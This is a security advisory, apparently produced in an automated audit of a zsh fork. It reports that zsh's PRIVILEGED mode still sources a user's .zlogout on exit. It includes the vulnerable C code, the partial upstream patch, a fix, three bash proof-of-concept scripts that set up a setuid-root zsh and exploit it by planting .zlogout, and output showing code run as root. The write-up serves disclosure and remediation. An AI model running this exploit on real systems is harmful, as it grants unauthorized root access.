# zsh `PRIVILEGED` option fails to protect `.zlogout` — local privilege escalation

**Target:** `speedyfriend433/zsh` (Apple's zsh fork, upstream base 5.9), branch `claude/trusting-babbage-twmg8u`, HEAD `666e91a` ("zsh-118")
**Class:** CWE-696 (Incorrect Behavior Order) / CWE-285 (Improper Authorization) — local privilege escalation via untrusted startup/shutdown file
**Privilege required to exploit:** **none.** Only the one-time *admin* setup step (installing the already-setuid-root `zsh`, or in production, Apple's installer already doing this) requires root — which is the normal, pre-existing precondition this bug class assumes, not something the attacker does. The attacker's two steps (drop a dotfile, run `exit`) use zero elevated privilege, no `sudo`, no password.

## Summary

`PRIVILEGED` mode in zsh (auto-enabled when real UID ≠ effective UID, or settable with `-p` / `setopt privileged`) exists to stop an elevated shell from sourcing dotfiles that a lower-privileged real user controls. The manual states plainly:

> "The `PRIVILEGED` option disables sourcing user startup files." (`Doc/Zsh/options.yo:2457`)

The implementation correctly gates `.zshenv`, `.zprofile`, `.zshrc`, and `.zlogin` behind `unset(PRIVILEGED)`, but **`.zlogout` is sourced unconditionally** in the portable (non-Apple) code path. A local attacker who can get a `PRIVILEGED` zsh to run interactively as a login shell under their own `$HOME`/`$ZDOTDIR` gets arbitrary code execution at the shell's effective privilege merely by exiting the shell (`exit`, `logout`, or EOF/Ctrl-D) — an action requiring no privilege at all.

This affects any real-world `PRIVILEGED` context: a classic setuid-root zsh script (the scenario reproduced below), or — in this Apple fork specifically — the `APPLE_PKGKIT_ESCALATING_ROOT` / `CS_INSTALLER` mechanism that marks a genuinely-root zsh (installer postinstall scripts) as `PRIVILEGED` purely to suppress untrusted dotfile sourcing, with no real UID to "drop" to.

## Root cause

`zsh/Src/builtin.c`, in `zexit()`:

```c
if (islogin && !subsh) {
#ifdef __APPLE__
    if (unset(PRIVILEGED))
        sourcehome(".zlogout");   // fixed — Apple builds only
#else
    sourcehome(".zlogout");       // ← always runs, no PRIVILEGED check
#endif
    ...
```

Compare with the (correct) startup-file gating in `zsh/Src/init.c`:

```c
if (isset(RCS) && unset(PRIVILEGED))
    sourcehome(".zprofile");   // line 1418
if (isset(RCS) && unset(PRIVILEGED))
    sourcehome(".zshrc");      // line 1431
if (isset(RCS) && unset(PRIVILEGED))
    sourcehome(".zlogin");     // line 1444
```

`.zlogout` is the only member of the startup/shutdown-file family left unguarded in the portable code.

### History
- zsh-workers mailing list, Jan 2019: "[PATCH/RFC] Don't source .zlogout if privileged" was proposed and apparently never merged upstream.
- This repo's own latest commit, `666e91a` ("zsh-118", Apr 2026), independently rediscovered and patched it — but only inside `#ifdef __APPLE__`, leaving the shared/portable branch (used whenever `__APPLE__` is undefined) still vulnerable:

```diff
 if (islogin && !subsh) {
+#ifdef __APPLE__
+    if (unset(PRIVILEGED))
+        sourcehome(".zlogout");
+#else
     sourcehome(".zlogout");
+#endif
```

## Who needs root, and for what

This is the part worth being precise about, since a `sudo`-prefixed PoC line can read as "you need root to exploit this." You don't. There are three distinct roles, run by two distinct principals:

| Step | Script | Run as | Needs root/sudo/password? |
|---|---|---|---|
| 1. Install the setuid-root `zsh` and create a test account | `01_admin_setup.sh` | root (admin) | **Yes** — but this is not the attack. It only recreates a precondition that already exists on real systems without any attacker action (an existing setuid-root `zsh`, or Apple's installer invoking real-root `zsh` with `PRIVILEGED` set). |
| 2. Drop `.zlogout`, run the setuid `zsh`, exit it | `02_attacker_exploit.sh` | unprivileged user | **No.** This is the entire attack, and it needs nothing beyond what any local account already has. |
| 3. Confirm the payload executed as root | `03_admin_verify.sh` | root (admin) | Yes, but only because `/root` is `0700` — the attacker has no visibility into `/root` either, exactly like a real attacker wouldn't. This step exists for the PoC's own benefit, not the attacker's. |

In other words: `sudo` only appears in steps you'd expect to already be true of a production system (an admin already made `zsh` setuid-root, or Apple's installer already runs `zsh` as real root) — never in the exploitation itself.

## Minimal PoC

Three scripts (self-contained, self-cleaning overall):

**`01_admin_setup.sh`** (root, one-time, not part of the attack):
```bash
#!/bin/bash
set -euo pipefail
ZSH_BIN="${1:?usage: 01_admin_setup.sh /path/to/built/zsh}"
WORK=/tmp/zlogout_poc
SUID_ZSH="$WORK/zsh-suid"
mkdir -p "$WORK"
cp "$ZSH_BIN" "$SUID_ZSH"; chown root:root "$SUID_ZSH"; chmod 4755 "$SUID_ZSH"
chmod 1777 "$WORK"
id poc_attacker >/dev/null 2>&1 || useradd -m -s /bin/bash poc_attacker
```

**`02_attacker_exploit.sh`** (unprivileged, the actual attack — no sudo anywhere):
```bash
#!/bin/bash
set -euo pipefail
SUID_ZSH=/tmp/zlogout_poc/zsh-suid
PROOF=/root/pwned_by_zlogout_poc.txt

echo nope > "$PROOF" 2>/dev/null && echo "unexpected" || echo "confirmed: no direct /root access"

cat > ~/.zlogout <<EOF
id > $PROOF
echo "PRIVESC: PRIVILEGED zsh ran attacker .zlogout as \$(id -un)" >> $PROOF
EOF
cat > ~/.zshrc <<EOF
echo "must never appear -- .zshrc IS correctly blocked by PRIVILEGED" > /root/should_not_exist.txt
EOF

echo exit | "$SUID_ZSH" -l -i   # <- the entire attack: log in, exit
```

**`03_admin_verify.sh`** (root, for the PoC's own benefit — attacker never needs this):
```bash
#!/bin/bash
PROOF=/root/pwned_by_zlogout_poc.txt
CONTROL=/root/should_not_exist.txt
[ -f "$CONTROL" ] && echo "FAIL: .zshrc ran" || echo "OK: .zshrc blocked"
[ -f "$PROOF" ] && { echo "VULN: .zlogout ran as $(stat -c '%U' "$PROOF")"; cat "$PROOF"; } \
                || echo "OK: not vulnerable"
```

## Fresh run output (this session), all three phases

```
########## PHASE 1: admin setup (requires root) ##########
[admin] installed setuid-root zsh at /tmp/zlogout_poc/zsh-suid:
-rwsr-xr-x 1 root root 869776 Oct  1 07:32 /tmp/zlogout_poc/zsh-suid
[admin] unprivileged test account ready:
uid=30033(poc_attacker) gid=30033(poc_attacker) groups=30033(poc_attacker)
[admin] setup done. Everything from here runs as poc_attacker, no sudo, no password.

########## PHASE 2: attacker exploit (NO root, NO sudo, NO password) ##########
[attacker] whoami: poc_attacker  id: uid=30033(poc_attacker) gid=30033(poc_attacker) groups=30033(poc_attacker)
[attacker] sanity check -- can I write to /root directly?
    -> permission denied, as expected. No standing access to /root.
[attacker] dropping my own .zlogout / .zshrc in $HOME (no special permissions needed)
[attacker] running the setuid-root zsh as an interactive login shell, then exiting
[attacker] (this is the entire attack -- no password, no sudo, no setuid tooling of my own)
[attacker] done. Note: I (poc_attacker) cannot even stat() /root (mode 0700),
[attacker] so I have no way to self-verify the result -- same as a real attacker.
[attacker] Checking outcome requires the admin/root view: run 03_admin_verify.sh.

########## PHASE 3: admin verifies the outcome (requires root) ##########
[admin] checking outcome:
    OK:   .zshrc correctly blocked by PRIVILEGED
    VULN: .zlogout ran despite PRIVILEGED -- owner is root:poc_attacker
    --- contents (written by code the attacker authored, with root's privileges) ---
uid=30033(poc_attacker) gid=30033(poc_attacker) euid=0(root) groups=30033(poc_attacker)
PRIVESC: PRIVILEGED zsh ran attacker .zlogout as root
```

`euid=0(root)` in the captured `id` output, written to a file the attacker (`poc_attacker`, `uid=30033`) cannot otherwise create or even `stat`, is the proof: `.zlogout` content supplied entirely by the unprivileged real user executed with root's effective privileges during phase 2, using zero elevated privilege of its own. The sibling `.zshrc` check passing confirms `PRIVILEGED` *is* working everywhere else in the same run — isolating the gap to this one file.

## Fix

Apply the same guard used for `.zshrc`/`.zprofile`/`.zlogin`, unconditionally (not just under `__APPLE__`):

```c
if (islogin && !subsh) {
    if (unset(PRIVILEGED))
        sourcehome(".zlogout");
    ...
```

## Environment / reproduction notes

- Built from this repo's unmodified source (`zsh/` subtree) with `./Util/preconfig && ./configure --without-tcsetpgrp && make`, zsh 5.9, on Linux (so `__APPLE__` is undefined — i.e. the still-vulnerable branch).
- No repository files were modified; all PoC artifacts (setuid binary, test user, `/root` files) are created during the run and removed afterward.
- `/root` is `0700` throughout — `poc_attacker` never gains visibility into it beyond writing the one file `.zlogout` tells it to, which is the point: the attacker doesn't need to see `/root` to abuse it.
- The `check_managed_config()` / `PARANOID` / `APPLE_PKGKIT_ESCALATING_ROOT` machinery (`zsh/Src/init.c:274-289`, `zsh/Src/utils.c:7720-7729`) could not be exercised here since it requires macOS (`csops()`, code-signing flags); the finding above does not depend on it and reproduces fully on Linux via the generic setuid-root `PRIVILEGED` path, which exercises the exact same `sourcehome(".zlogout")` call site.
